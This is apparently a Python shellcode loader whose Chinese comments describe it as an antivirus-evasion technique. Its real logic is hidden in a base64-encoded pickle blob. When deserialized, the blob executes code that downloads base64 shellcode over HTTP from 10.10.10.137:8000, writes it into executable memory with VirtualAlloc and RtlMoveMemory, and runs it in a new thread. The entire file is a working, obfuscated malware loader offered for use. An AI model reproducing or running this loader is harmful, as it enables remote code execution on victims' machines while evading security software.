# 免杀思路：shellcode加载器代码序列化 -> base64加密 -> base64密文在另一个文件中解密并反序列化并执行
import ctypes
import urllib3
import requests,codecs,base64
import  pickle
import sys
import base64

# base64加密的序列化payload
# gANjYnVpbHRpbnMKZXhlYwpxAFiZBAAACiMgYmFzZTY057yW56CB55qEc2hlbGxjb2RlCmh0dHAgPSB1cmxsaWIzLlBvb2xNYW5hZ2VyKCkgCnJlc3BvbnNlID0gaHR0cC5yZXF1ZXN0KCdHRVQnLCAnaHR0cDovLzEwLjEwLjEwLjEzNzo4MDAwL3NoZWxsY29kZWJhc2U2NC5iaW4nKSAKc2hlbGxjb2RlID0gcmVzcG9uc2UuZGF0YQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHNoZWxsY29kZSkgIyBiYXNlNjTop6Plr4YKc2hlbGxjb2RlID1jb2RlY3MuZXNjYXBlX2RlY29kZShzaGVsbGNvZGUpWzBdCgpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKSAjIOi/lOWbnuaWsOWtl+iKguaVsOe7hApwcmludChzaGVsbGNvZGUpCiMg6K6+572uVmlydHVhbEFsbG9j6L+U5Zue57G75Z6L5Li6Y3R5cGVzLmNfdWludDY0CmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKIyDnlLPor7flhoXlrZgKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQoKIyDmlL7lhaVzaGVsbGNvZGUKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBidWYsIAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCiMg5Yib5bu65LiA5Liq57q/56iL5LuOc2hlbGxjb2Rl6Ziy5q2i5L2N572u6aaW5Zyw5Z2A5byA5aeL5omn6KGMCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkKKQojIOetieW+heS4iumdouWIm+W7uueahOe6v+eoi+i/kOihjOWujApjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGhhbmRsZSksY3R5cGVzLmNfaW50KC0xKSkKCnEBhXECUnEDLg==
serialize_encode = b'gANjYnVpbHRpbnMKZXhlYwpxAFiZBAAACiMgYmFzZTY057yW56CB55qEc2hlbGxjb2RlCmh0dHAgPSB1cmxsaWIzLlBvb2xNYW5hZ2VyKCkgCnJlc3BvbnNlID0gaHR0cC5yZXF1ZXN0KCdHRVQnLCAnaHR0cDovLzEwLjEwLjEwLjEzNzo4MDAwL3NoZWxsY29kZWJhc2U2NC5iaW4nKSAKc2hlbGxjb2RlID0gcmVzcG9uc2UuZGF0YQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHNoZWxsY29kZSkgIyBiYXNlNjTop6Plr4YKc2hlbGxjb2RlID1jb2RlY3MuZXNjYXBlX2RlY29kZShzaGVsbGNvZGUpWzBdCgpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKSAjIOi/lOWbnuaWsOWtl+iKguaVsOe7hApwcmludChzaGVsbGNvZGUpCiMg6K6+572uVmlydHVhbEFsbG9j6L+U5Zue57G75Z6L5Li6Y3R5cGVzLmNfdWludDY0CmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKIyDnlLPor7flhoXlrZgKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQoKIyDmlL7lhaVzaGVsbGNvZGUKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBidWYsIAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCiMg5Yib5bu65LiA5Liq57q/56iL5LuOc2hlbGxjb2Rl6Ziy5q2i5L2N572u6aaW5Zyw5Z2A5byA5aeL5omn6KGMCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkKKQojIOetieW+heS4iumdouWIm+W7uueahOe6v+eoi+i/kOihjOWujApjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGhhbmRsZSksY3R5cGVzLmNfaW50KC0xKSkKCnEBhXECUnEDLg=='

serialize_decode = base64.b64decode(serialize_encode)
# 反序列化并执行
unserialize = pickle.loads(serialize_decode) 